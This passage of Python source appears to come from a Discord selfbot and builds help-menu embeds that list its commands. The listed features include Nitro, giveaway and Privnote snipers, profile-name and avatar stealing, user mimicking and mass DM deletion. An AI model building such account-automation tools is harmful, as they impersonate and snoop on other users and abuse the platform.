        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(usage="toastnotifs", description="Shows Windows Toast notifications commands")
    async def toastnotifs(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Nitro Redeem: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["nitro_redeem_notify"] else "Disabled"}**
Giveaway Win: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["giveaway_win_notify"] else "Disabled"}**
Giveaway Join: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["giveaway_join_notify"] else "Disabled"}**
Selfbot Detection: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["selfbot_detection_notify"] else "Disabled"}**
Ghostpings: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ghostping_notify"] else "Disabled"}**
DM Deletions: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["deleted_dm_notify"] else "Disabled"}**
Privnotes: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["privnote_snipe_notify"] else "Disabled"}**
Server Ban: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["server_ban_notify"] else "Disabled"}**
Tickets: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ticket_notify"] else "Disabled"}**
Relationships: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["relationship_notify"] else "Disabled"}**
Role Updates: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["role_update_notify"] else "Disabled"}**
Nickname Updates: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["nickname_update_notify"] else "Disabled"}**

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nnitroredeem').name}** ¬ª {React.get_command('nnitroredeem').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ndmdels').name}** ¬ª {React.get_command('ndmdels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nghostping').name}** ¬ª {React.get_command('nghostping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nprivnote').name}** ¬ª {React.get_command('nprivnote').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ngiveawaywin').name}** ¬ª {React.get_command('ngiveawaywin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ngiveawayjoin').name}** ¬ª {React.get_command('ngiveawayjoin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nsbdetection').name}** ¬ª {React.get_command('nsbdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ntickets').name}** ¬ª {React.get_command('ntickets').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nrelationships').name}** ¬ª {React.get_command('nrelationships').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nroleupdates').name}** ¬ª {React.get_command('nroleupdates').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nnickname').name}** ¬ª {React.get_command('nnickname').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="usersettings", description="Discord User settings commands")
    async def usersettings(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('status').name}** ¬ª {React.get_command('status').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('darkmode').name}** ¬ª {React.get_command('darkmode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lightmode').name}** ¬ª {React.get_command('lightmode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('messagedisplay').name}** ¬ª {React.get_command('messagedisplay').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('developer').name}** ¬ª {React.get_command('developer').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('typing').name}** ¬ª {React.get_command('typing').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('invisiblenickname').name}** ¬ª {React.get_command('invisiblenickname').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('junknickname').name}** ¬ª {React.get_command('junknickname').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hypesquad').name}** ¬ª {React.get_command('hypesquad').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('addfriend').name}** ¬ª {React.get_command('addfriend').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unfriend').name}** ¬ª {React.get_command('unfriend').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('block').name}** ¬ª {React.get_command('block').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unblock').name}** ¬ª {React.get_command('unblock').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('setusername').name}** ¬ª {React.get_command('setusername').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('setpfp').name}** ¬ª {React.get_command('setpfp').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unverify').name}** ¬ª {React.get_command('unverify').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(usage="botsettings", description="Selfbot settings commands")
    async def botsettings(ctx):
        global afk_stat
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''AFK Mode: **{"Enabled" if afk_stat == 1 else "Disabled"}**
AFK Message: **{json.load(open("config.json", encoding="utf-8"))["afk_message"]}**

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('changeprefix').name}** ¬ª {React.get_command('changeprefix').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('restartbot').name}** ¬ª {React.get_command('restartbot').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopbot').name}** ¬ª {React.get_command('stopbot').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('updatebot').name}** ¬ª {React.get_command('updatebot').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('showsettings').name}** ¬ª {React.get_command('showsettings').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletecommands').name}** ¬ª {React.get_command('deletecommands').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('disablecommand').name}** ¬ª {React.get_command('disablecommand').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('enablecommand').name}** ¬ª {React.get_command('enablecommand').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('disabledcommands').name}** ¬ª {React.get_command('disabledcommands').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nitrosniper').name}** ¬ª {React.get_command('nitrosniper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('selfbotdetection').name}** ¬ª {React.get_command('selfbotdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('privnotesniper').name}** ¬ª {React.get_command('privnotesniper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ghostpingdetection').name}** ¬ª {React.get_command('ghostpingdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('giveawaysniper').name}** ¬ª {React.get_command('giveawaysniper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('giveawaytimeout').name}** ¬ª {React.get_command('giveawaytimeout').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('giveawayblacklistadd').name}** ¬ª {React.get_command('giveawayblacklistadd').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('giveawayblacklistdel').name}** ¬ª {React.get_command('giveawayblacklistdel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('giveawayblacklist').name}** ¬ª {React.get_command('giveawayblacklist').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ignorenitro').name}** ¬ª {React.get_command('ignorenitro').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopignorenitro').name}** ¬ª {React.get_command('stopignorenitro').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ticketdetection').name}** ¬ª {React.get_command('ticketdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('relationshipdetection').name}** ¬ª {React.get_command('relationshipdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('afkmsg').name}** ¬ª {React.get_command('afkmsg').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletetimeout').name}** ¬ª {React.get_command('deletetimeout').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('streamingurl').name}** ¬ª {React.get_command('streamingurl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('whookurls').name}** ¬ª {React.get_command('whookurls').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('snotifs').name}** ¬ª {React.get_command('snotifs').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('toastnotifs').name}** ¬ª {React.get_command('toastnotifs').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(usage="customization", description="Selfbot customization commands")
    async def customization(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Current Theme: **{json.load(open("config.json", encoding="utf-8"))["theme"]}**
Current Language: **{json.load(open("config.json", encoding="utf-8"))["language"]}**
Theme Shuffle: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["theme_shuffle"] else "Disabled"}**
Mode: **{"Embed" if json.load(open("config.json", encoding="utf-8"))["embed_mode"] else "Codeblock"}**

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('themes').name}** ¬ª {React.get_command('themes').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('theme').name}** ¬ª {React.get_command('theme').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cloudthemes').name}** ¬ª {React.get_command('cloudthemes').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cloudthemeinstall').name}** ¬ª {React.get_command('cloudthemeinstall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('newtheme').name}** ¬ª {React.get_command('newtheme').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deltheme').name}** ¬ª {React.get_command('deltheme').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('themeshuffle').name}** ¬ª {React.get_command('themeshuffle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('exporttheme').name}** ¬ª {React.get_command('exporttheme').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('languages').name}** ¬ª {React.get_command('languages').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('language').name}** ¬ª {React.get_command('language').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('switchmode').name}** ¬ª {React.get_command('switchmode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sbtitle').name}** ¬ª {React.get_command('sbtitle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('globalemoji').name}** ¬ª {React.get_command('globalemoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedcolor').name}** ¬ª {React.get_command('embedcolor').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedthumbnail').name}** ¬ª {React.get_command('embedthumbnail').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedauthorname').name}** ¬ª {React.get_command('embedauthorname').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedauthoricon').name}** ¬ª {React.get_command('embedauthoricon').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedauthorurl').name}** ¬ª {React.get_command('embedauthorurl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedtitleurl').name}** ¬ª {React.get_command('embedtitleurl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedfootericon').name}** ¬ª {React.get_command('embedfootericon').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embedfooter').name}** ¬ª {React.get_command('embedfooter').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('footertimestamp').name}** ¬ª {React.get_command('footertimestamp').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)

    @React.command(usage="user [Page/All]", description="User and Selfbot commands")
    async def user(ctx, page: str=None):
        try:
            em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
            f'''Page 1/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('customcmdadd').name}** ¬ª {React.get_command('customcmdadd').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('customcmddel').name}** ¬ª {React.get_command('customcmddel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('customcmdlist').name}** ¬ª {React.get_command('customcmdlist').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('remotecommandsuseradd').name}** ¬ª {React.get_command('remotecommandsuseradd').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('remotecommandsuserdel').name}** ¬ª {React.get_command('remotecommandsuserdel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cmdhistory').name}** ¬ª {React.get_command('cmdhistory').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('clearlog').name}** ¬ª {React.get_command('clearlog').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('copyuser').name}** ¬ª {React.get_command('copyuser').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopcopy').name}** ¬ª {React.get_command('stopcopy').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopcopyall').name}** ¬ª {React.get_command('stopcopyall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('copymock').name}** ¬ª {React.get_command('copymock').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopcopymock').name}** ¬ª {React.get_command('stopcopymock').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletesend').name}** ¬ª {React.get_command('deletesend').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopdeletesend').name}** ¬ª {React.get_command('stopdeletesend').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ignoreuser').name}** ¬ª {React.get_command('ignoreuser').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopignoreuser').name}** ¬ª {React.get_command('stopignoreuser').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopignoreallusers').name}** ¬ª {React.get_command('stopignoreallusers').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ignorepings').name}** ¬ª {React.get_command('ignorepings').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ignoreallpings').name}** ¬ª {React.get_command('ignoreallpings').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('clearpings').name}** ¬ª {React.get_command('clearpings').description}''',timestamp=embed_timestamp())
            em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
            f'''Page 2/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('afk').name}** ¬ª {React.get_command('afk').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('afklog').name}** ¬ª {React.get_command('afklog').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stats').name}** ¬ª {React.get_command('stats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('userstats').name}** ¬ª {React.get_command('userstats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mutualguilds').name}** ¬ª {React.get_command('mutualguilds').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mutualfriends').name}** ¬ª {React.get_command('mutualfriends').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('guilds').name}** ¬ª {React.get_command('guilds').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('blocks').name}** ¬ª {React.get_command('blocks').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stealname').name}** ¬ª {React.get_command('stealname').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stealpfp').name}** ¬ª {React.get_command('stealpfp').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stealnameandpfp').name}** ¬ª {React.get_command('stealnameandpfp').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('blockdms').name}** ¬ª {React.get_command('blockdms').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('blockincomingfriends').name}** ¬ª {React.get_command('blockincomingfriends').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('noleave').name}** ¬ª {React.get_command('noleave').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('allowleave').name}** ¬ª {React.get_command('allowleave').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('richpresence').name}** ¬ª {React.get_command('richpresence').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('leaveallservers').name}** ¬ª {React.get_command('leaveallservers').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deleteallfriends').name}** ¬ª {React.get_command('deleteallfriends').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletealldms').name}** ¬ª {React.get_command('deletealldms').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cloudscripts').name}** ¬ª {React.get_command('cloudscripts').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cloudscriptinstall').name}** ¬ª {React.get_command('cloudscriptinstall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('addfavorite').name}** ¬ª {React.get_command('addfavorite').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('delfavorite').name}** ¬ª {React.get_command('delfavorite').description}''',timestamp=embed_timestamp())
            em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            if page == '1' or page == None:
                await embed_or_codeblock(ctx, em)
            elif page == '2':
                await embed_or_codeblock(ctx, em2)
            elif page.lower() == 'all':
                await embed_or_codeblock(ctx, em)
                await embed_or_codeblock(ctx, em2)

        except:
            pass

    @React.command(usage="image [Page/All]", description="Image commands")
    async def image(ctx, page: str=None):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 1/5

